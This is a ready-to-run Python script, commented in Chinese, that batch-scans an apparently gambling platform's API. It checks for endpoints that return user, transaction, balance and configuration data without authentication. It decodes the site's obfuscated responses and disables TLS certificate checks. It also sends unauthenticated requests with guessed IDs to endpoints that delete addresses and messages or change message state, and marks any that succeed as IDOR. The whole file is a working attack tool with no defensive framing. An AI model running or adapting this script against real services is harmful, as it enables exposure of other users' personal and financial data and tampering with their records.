#!/usr/bin/env python3
"""IDOR + 未认证API批量测试模板

使用方法:
1. 修改 TARGET 为目标URL
2. 修改 api_list 为需要测试的API列表
3. 运行: python3 idor-batch-test.py

功能:
- 批量测试API端点是否需要认证
- 自动解密反转+Base64响应
- 识别返回数据的端点(信息泄露)
- 识别IDOR漏洞(带id参数的端点)
"""
import urllib.request
import json
import ssl
import base64

# 配置
TARGET = "https://TARGET.com"
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

def decrypt(body):
    """解密反转+Base64响应"""
    try:
        return json.loads(base64.b64decode(body[::-1]).decode())
    except:
        return body[:200]

def test_api(endpoint, method="GET", data=None):
    """测试单个API端点"""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (IDOR-Test)",
            "Referer": f"{TARGET}/m/#/home"
        }
        
        if method == "POST" and data:
            headers["Content-Type"] = "application/json"
            req = urllib.request.Request(
                f"{TARGET}{endpoint}",
                data=json.dumps(data).encode(),
                headers=headers
            )
        else:
            req = urllib.request.Request(
                f"{TARGET}{endpoint}",
                headers=headers
            )
        
        resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)
        body = resp.read().decode()
        result = decrypt(body)
        
        return {
            "status": resp.status,
            "data": result,
            "is_dict": isinstance(result, dict),
            "has_data": isinstance(result, dict) and result.get("data") is not None,
            "is_error": isinstance(result, dict) and result.get("state") == "error",
            "error_msg": result.get("message", "") if isinstance(result, dict) else ""
        }
    except Exception as e:
        return {
            "status": 0,
            "error": str(e)[:100],
            "is_error": True
        }

def main():
    """主测试流程"""
    # API列表 - 按类别组织
    api_categories = {
        "用户信息": [
            "/api/User/GetUserInfo",
            "/api/User/GetAccount",
            "/api/User/GetAccountNew",
            "/api/User/GetUserbetRpt",
            "/api/User/GetOrderList_New",
            "/api/User/GetTransList",
            "/api/User/GetLotterList",
            "/api/User/GetIntBet",
            "/api/User/GetSumUserReturnAmt",
            "/api/User/GetReturnAmtList",
        ],
        "消息系统": [
            "/api/User/GetMessageList",
            "/api/User/GetNoReadMessageCount",
            "/api/User/GetUserMsgConsultList",
            "/api/User/GetAgentMsgList",
        ],
        "推荐系统": [
            "/api/userfan/TotolSelfFanAMT",
            "/api/userfan/UserFanRate",
            "/api/userfan/UserFanInfo",
            "/api/userfan/FanReceive",
        ],
        "代理系统": [
            "/api/Agent/GetFundChgDtlList",
            "/api/Agent/GetGameList",
        ],
        "商城系统": [
            "/api/shop/GetShopUserAddressList",
            "/api/shop/GetShopCarList",
            "/api/shop/GetOrderList",
            "/api/shop/GetPointBuyOrderList",
            "/api/shop/GetShopIndex",
            "/api/shop/GetShopProductList",
            "/api/shop/GetMyBalance",
        ],
        "活动系统": [
            "/api/Act/GetActTasksConfigList",
            "/api/Act/GetActVsList",
            "/api/Act/GetActRedEnvelopesConfig",
            "/api/Act/GetActWebActivityList",
        ],
        "网站配置": [
            "/api/Web/GetAllBasicWebsiteConfigurationNew",
            "/api/Web/GetAccountList",
            "/api/Web/GetMenuList",
            "/api/Web/GetMobileList",
            "/api/Web/GetLiveChatLink",
            "/api/Web/GetNotice",
            "/api/Web/GetPhoneCallBackConfig",
            "/api/Web/GetWebPrefeClick",
            "/api/Web/GetNavRecharge",
            "/api/Web/GetCldSiteConfig",
        ],
        "余额系统": [
            "/api/YuBao/GetTrsConfig",
            "/api/Api/GetBalance",
        ],
        "验证码/注册": [
            "/api/User/RegProperties",
            "/api/User/RegQuestions",
            "/api/User/GetAgentMode",
            "/api/Api/GetVerifyCodeNew",
        ],
    }
    
    print("=" * 60)
    print("IDOR + 未认证API批量测试")
    print(f"目标: {TARGET}")
    print("=" * 60)
    
    # 测试结果分类
    no_auth = []  # 不需要认证的端点
    need_auth = []  # 需要认证的端点
    errors = []  # 请求错误
    
    for category, apis in api_categories.items():
        print(f"\n{'='*40}")
        print(f"类别: {category}")
        print(f"{'='*40}")
        
        for api in apis:
            result = test_api(api)
            
            if result.get("error"):
                print(f"  ⚠️ {api}: {result['error']}")
                errors.append(api)
            elif result.get("is_error") and "会话已过期" in result.get("error_msg", ""):
                print(f"  🔒 {api}: 需要认证")
                need_auth.append(api)
            elif result.get("is_error"):
                print(f"  ❌ {api}: {result.get('error_msg', '')[:80]}")
            else:
                data_preview = str(result.get("data", ""))[:80]
                print(f"  ✅ {api}: {data_preview}")
                no_auth.append(api)
    
    # 总结
    print("\n" + "=" * 60)
    print("测试总结")
    print("=" * 60)
    print(f"总测试: {sum(len(v) for v in api_categories.values())}")
    print(f"无需认证: {len(no_auth)}")
    print(f"需要认证: {len(need_auth)}")
    print(f"请求错误: {len(errors)}")
    
    if no_auth:
        print(f"\n🚨 发现 {len(no_auth)} 个无需认证的API端点:")
        for api in no_auth:
            print(f"  - {api}")
    
    # IDOR测试 - 带参数的端点
    print("\n" + "=" * 60)
    print("IDOR测试 - 带参数端点")
    print("=" * 60)
    
    idor_endpoints = [
        {"url": "/api/shop/ShopUserAddressSetDefault?id=1", "desc": "设置默认地址"},
        {"url": "/api/shop/ShopUserAddressDel?id=1", "desc": "删除地址"},
        {"url": "/api/User/UpdMessageState?MsgID=1", "desc": "更新消息状态"},
        {"url": "/api/User/DelMessage?detail_id=1", "desc": "删除消息"},
    ]
    
    for ep in idor_endpoints:
        result = test_api(ep["url"])
        if result.get("is_error") and "会话已过期" in result.get("error_msg", ""):
            print(f"  🔒 {ep['desc']}: 需要认证")
        elif result.get("is_error"):
            print(f"  ❌ {ep['desc']}: {result.get('error_msg', '')[:80]}")
        else:
            print(f"  ✅ {ep['desc']}: 可能存在IDOR!")

if __name__ == "__main__":
    main()
